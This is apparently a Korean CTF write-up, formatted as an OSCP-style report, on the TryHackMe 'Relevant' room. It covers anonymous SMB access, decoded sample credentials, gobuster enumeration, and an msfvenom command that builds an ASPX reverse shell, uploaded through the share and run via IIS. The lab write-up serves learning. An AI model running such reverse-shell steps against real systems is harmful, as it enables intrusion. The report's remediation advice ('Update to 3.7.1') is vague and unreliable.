1.0 Offensive Security Exam Penetration Test Report

1.1 Introduction(소개)

이번 보고서는 TryHackme의 Relevant 트랙에 대한 해설과 풀이 과정등을 나열한 보고서입니다.

1.2 Objective(목표)

이번 보고서를 작성한 이유는 OSCP 보고서 양식에 익숙해지기 위해서이며, 또한 보안 보고서를 이용한 사후 평가에 익숙해지기 위함입니다.

1.3 Requirements(요구 사항)

클라이언트는 엔지니어에게 제공된 가상 환경에 대한 평가를 수행하도록 요청합니다. 클라이언트는 악의적인 행위자의 눈으로 참여하기를 원하며 평가에 대한 최소한의 정보를 제공하도록 요청했습니다(블랙박스 침투 테스트). 클라이언트는 악용의 증거로 두 개의 플래그(위치 제공 없음)를 확보할 것을 ​​요청했습니다.

  • 사용자.txt
  • 루트.txt

또한 클라이언트는 다음과 같은 범위 허용을 제공했습니다.

  • 이 작업에는 모든 도구나 기술이 허용되지만 먼저 수동 악용을 시도해 보시기 바랍니다.
  • 발견된 모든 취약점을 찾아 기록해 둡니다.
  • 발견된 플래그를 대시보드에 제출
  • 귀하의 컴퓨터에 할당된 IP 주소만 범위 내에 있습니다.
  • 모든 취약점을 찾아서 보고하세요(예, 루트로 가는 경로가 두 개 이상 있습니다)

2.0 High-Level Summary

이번 트랙에서는 SMB 공유에서 심각한 취약점을 발견하였습니다. 이를 이용하여 SMB의 DISK에 접속한 뒤에 중요한 정보를 탈취 및 업로드 하였습니다. 또한 가상머신에서 제공 중인 IIS 서버가 공유 디스크를 접근 디렉토리로써 제공한다는 점을 이용하여 쉘을 업로드하여 실행시켰습니다.  권한 탈취에 관해서는 사용자에 대한 SeImpersonatePrivilege가 허용되어 있음을 확인하고 이에 대한 exploit을 사용하여 권한을 탈취하였습니다.

권한 승격: (사용 exploit) -> PrintSpoofer

2.1 Recommendations(권장 사항)

Metasploit을 사용하지 마시오.

3.1 Methodologies(방법론)

Vulnerability Explanation(**취약성 설명)**:  smb 구성 취약점

파일 공유 서비스인 smb에 별다른 인증 절차 없이 접속이 가능하였습니다.

Vulnerability Fix(**취약점 보완)**: Update to 3.7.1

정당한 접속 절차를 구성하는 것이 취약점을 보완할 수 있습니다**.**

Severity(**심각도)**:  Severe

Steps to reproduce the attack:

시작은 smbclient**를** 이용하여 해당 시스템에 접속하였습니다**. Nt4wrksv** 라는 공유 디스크가 자격 증명 없이 서버 연결이 가능하였습니다**.** 먼저 이 디스크에 유용한 정보가 있는 지 확인하였습니다**.**

이 암호 파일들을 base 64**로** 복호화 한 결과

Bob - !@#%$123

Bill - Juw4nnAM4n4206969969!!$$

위 정보들은 마땅한 인증 정보가 아니었습니다**. RDP** 연결에 대한 자격 증명도 작동하지 않았습니다**.**  그리하여 먼저 HTTP 서버를 확인하였습니다**. 80**번 대 포트에 gobuster**를** 사용하여 하위 디렉토리를 열거하였으나 별다른 소득을 발견하지 못했습니다**.** 그 다음으로는 49663**의** http 서버의 gobuster**을** 사용하였습니다**.** 확인 결과 /nt4wrksv 가 디렉토리로 제공되고 있음을 알았습니다**.** 저희는 smb**를** 사용하여 nt4wrksv 디스크에 접속이 가능하니 그 디스크에 먼저 리버스 쉘을 업로드하고 그 다음에 쉘을 실행시켜 내부에 접속하였습니다**.**

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.xxx LPORT=443 -f aspx > 관련**.aspx**

위 명령어로 리버스 쉘을 제작하고 smb  /nt4wrksv 디스크에 업로드 하였습니다**.**

그 다음에 웹 서비스를 통해 쉘을 실행시켜 내부에 접속하였습니다**.**

그렇게 하면 1**차적으로** 내부 침투에 성공합니다**.** 그렇게 하여 c:\users\bob\desktop\user.txt 에서 user**의** 사용자 해시를 얻을 수 있습니다**.**
